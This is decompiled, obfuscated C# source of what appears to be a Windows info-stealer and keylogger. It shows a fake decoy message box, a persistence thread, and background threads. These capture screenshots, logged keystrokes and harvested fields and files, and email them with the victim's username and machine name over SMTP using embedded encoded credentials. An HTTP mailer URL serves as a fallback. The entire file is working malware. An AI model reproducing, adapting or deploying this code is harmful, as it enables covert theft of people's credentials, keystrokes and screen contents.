using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using ns0;

public class IEBNQOUC
{
	public static string FTCGXUG;

	public static string FGXHHSQ;

	public static string TTIUSWG;

	public static string JOJFOQE;

	public static string CQVQLFM;

	public static string YTKMORB;

	public static string QWJDLTJ;

	public static string KSLSNFH;

	public static string DYHPIVI;

	public static string UFICMLP;

	public static string UOPFWIP;

	public static string BIEITQY;

	public static string PTSRTHO;

	public static string HHFJBSV = "";

	public static string IKEPDFR = HRKUSLC.KJSIUEP("tb7a0MWxytHdlHOVqNbOo8bUncSxygY=", "False");

	public static string VLMTVKF = HRKUSLC.KJSIUEP("rs/Z0NKilJenlXMG", "False");

	public static string NFYMBLH = HRKUSLC.KJSIUEP("t8ze4ZGrzMvaz3LC2d4G", "False");

	public static int TWUFDBE = 587;

	public static string KFYVOSE = HRKUSLC.KJSIUEP("DLEXSite", "False");

	public static string HBUTTIL = HRKUSLC.KJSIUEP("mL/KzYlfehg=", "False");

	public static string OUOFFJO = HRKUSLC.KJSIUEP("GA==", "False");

	public static string JNLOCOF = HRKUSLC.KJSIUEP("dLzHy8BpaoXUfl96jpR/Xxg=", "False");

	public static string YXYVKUY = HRKUSLC.KJSIUEP("iLXFwr+ov3extaPCwMG1pGy6zcWdsHfMv6Vsw82xlWyksZNkfoWinH16dxg=", "False");

	public static string HFRBJRD = HRKUSLC.KJSIUEP("dKrAzrIY", "False");

	public static string DHKOIIU = HRKUSLC.KJSIUEP("dKrAzrIY", "False");

	public static int IKKVKSQ = 3600000;

	public static string KXQNGOS = "";

	public static string LWHRWHJ = "";

	public static int number = 0;

	public static GMHJCMFV HRHDBITI;

	public static Thread YDXPJEMG = new Thread(GPMRWJII);

	public static Thread YEBJOXNK = new Thread(ENGPJWMF);

	public static Thread RunThread = new Thread(SDCNFRMTN);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	[STAThread]
	public static void Main()
	{
		//IL_0243: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Unknown result type (might be due to invalid IL or missing references)
		//IL_033d: Unknown result type (might be due to invalid IL or missing references)
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f9: Unknown result type (might be due to invalid IL or missing references)
		int num = default(int);
		try
		{
			Class6.smethod_1();
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)Class2.Class1_0).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)Class2.Class1_0).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				HRHDBITI = new GMHJCMFV(LWHRWHJ);
				GMHJCMFV.PTXIOCQK();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			YDXPJEMG.IsBackground = true;
			YDXPJEMG.Start();
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			string oUOFFJO = OUOFFJO;
			if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("ltLc2gI=", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)0);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("h6zIy7ieshg=", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("c8G3x66bqsjEvJwZ", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("bqqwuC8=", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("W6Ousqcw", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("kdDL4NOpytQJ", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)32);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("cKS8uSI=", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("h9Tg2Nev1NcD", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else if (Operators.CompareString(oUOFFJO, HRKUSLC.KJSIUEP("b6+ywreTosC8tJQh", "False"), false) == 0)
			{
				MessageBox.Show(YXYVKUY, JNLOCOF, (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				MessageBox.Show(HRKUSLC.KJSIUEP("mc3V39K7zYq21bbO3JGyp8Lf48iojYrBz6nA3daDq86K5dJkx97l036Omd7Mp9HZ5NKq05jU0rF/0ODVZMzZ48hkx8/d03ID", "False"), HRKUSLC.KJSIUEP("i7/H0cStv3yox6jAzhM=", "False"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			RunThread.IsBackground = true;
			RunThread.Start();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			YEBJOXNK.IsBackground = true;
			YEBJOXNK.Start();
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void BIYTOPH(ref double RFLOUNLN)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(RFLOUNLN);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void SDCNFRMTN()
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("i57H0bMX", "False")))
			{
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
					Bitmap val3 = val;
					((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					MailMessage mailMessage = new MailMessage();
					SmtpClient smtpClient = new SmtpClient(NFYMBLH);
					mailMessage.From = new MailAddress(IKEPDFR);
					mailMessage.To.Add(IKEPDFR);
					mailMessage.Subject = HRKUSLC.KJSIUEP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", "False") + Environment.MachineName.ToString();
					mailMessage.Body = HRKUSLC.KJSIUEP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + HRKUSLC.KJSIUEP("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False");
					smtpClient.Port = TWUFDBE;
					smtpClient.EnableSsl = true;
					smtpClient.Credentials = new NetworkCredential(IKEPDFR, VLMTVKF);
					try
					{
						Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
						mailMessage.Attachments.Add(item);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					smtpClient.Send(mailMessage);
					try
					{
						File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("i57H0bMX", "False"));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					try
					{
						string text = HRKUSLC.KJSIUEP("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
						_ = (HttpWebResponse)WebRequest.Create(text + "?to=" + IKEPDFR + "&subject=" + Strings.Replace(HRKUSLC.KJSIUEP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(HRKUSLC.KJSIUEP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + HRKUSLC.KJSIUEP("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False"), " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + IKEPDFR).GetResponse();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			RunThread.Abort();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	public static void GPMRWJII()
	{
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(IKKVKSQ);
				text = "";
				string text2 = "";
				double RFLOUNLN = 0.2;
				BIYTOPH(ref RFLOUNLN);
				try
				{
					WebClient webClient = new WebClient();
					text2 = HRKUSLC.KJSIUEP("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(HRKUSLC.KJSIUEP("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + HRKUSLC.KJSIUEP("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				RFLOUNLN = 1.0;
				BIYTOPH(ref RFLOUNLN);
				try
				{
					if (Operators.CompareString(HFRBJRD, HRKUSLC.KJSIUEP("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + HRKUSLC.KJSIUEP("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				RFLOUNLN = 0.3;
				BIYTOPH(ref RFLOUNLN);
				try
				{
					if (Operators.CompareString(LWHRWHJ, "", false) != 0)
					{
						KXQNGOS = HRKUSLC.KJSIUEP("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + LWHRWHJ + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						_ = 0;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(IKEPDFR);
							mailMessage2.To.Add(IKEPDFR);
							mailMessage2.Subject = HRKUSLC.KJSIUEP("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = KXQNGOS;
							try
							{
								if (Operators.CompareString(HFRBJRD, HRKUSLC.KJSIUEP("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + HRKUSLC.KJSIUEP("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(NFYMBLH);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = TWUFDBE;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(IKEPDFR, VLMTVKF);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = HRKUSLC.KJSIUEP("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + IKEPDFR + "&subject=" + Strings.Replace(HRKUSLC.KJSIUEP("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(KXQNGOS, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + IKEPDFR).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				KXQNGOS = "";
				LWHRWHJ = "";
				HHFJBSV = "";
				number++;
			}
		}
	}

	public static void ENGPJWMF()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", HRKUSLC.KJSIUEP("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HRKUSLC.KJSIUEP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", HRKUSLC.KJSIUEP("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		_ = 0;
		try
		{
			double RFLOUNLN = 25.0;
			BIYTOPH(ref RFLOUNLN);
			string text = HRKUSLC.KJSIUEP("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + FTCGXUG + Environment.NewLine + Environment.NewLine + FGXHHSQ + Environment.NewLine + Environment.NewLine + TTIUSWG + Environment.NewLine + Environment.NewLine + JOJFOQE + Environment.NewLine + Environment.NewLine + CQVQLFM + Environment.NewLine + Environment.NewLine + YTKMORB + Environment.NewLine + Environment.NewLine + QWJDLTJ + Environment.NewLine + Environment.NewLine + KSLSNFH + Environment.NewLine + Environment.NewLine + UFICMLP + Environment.NewLine + Environment.NewLine + UOPFWIP + Environment.NewLine + Environment.NewLine + BIEITQY + Environment.NewLine + Environment.NewLine + PTSRTHO + Environment.NewLine + Environment.NewLine + HRKUSLC.KJSIUEP("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(IKEPDFR);
				mailMessage2.To.Add(IKEPDFR);
				mailMessage2.Subject = HRKUSLC.KJSIUEP("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", HRKUSLC.KJSIUEP("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(NFYMBLH);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = TWUFDBE;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(IKEPDFR, VLMTVKF);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = HRKUSLC.KJSIUEP("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + IKEPDFR + "&subject=" + Strings.Replace(HRKUSLC.KJSIUEP("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + HRKUSLC.KJSIUEP("aQ0=", HRKUSLC.KJSIUEP("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + IKEPDFR).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
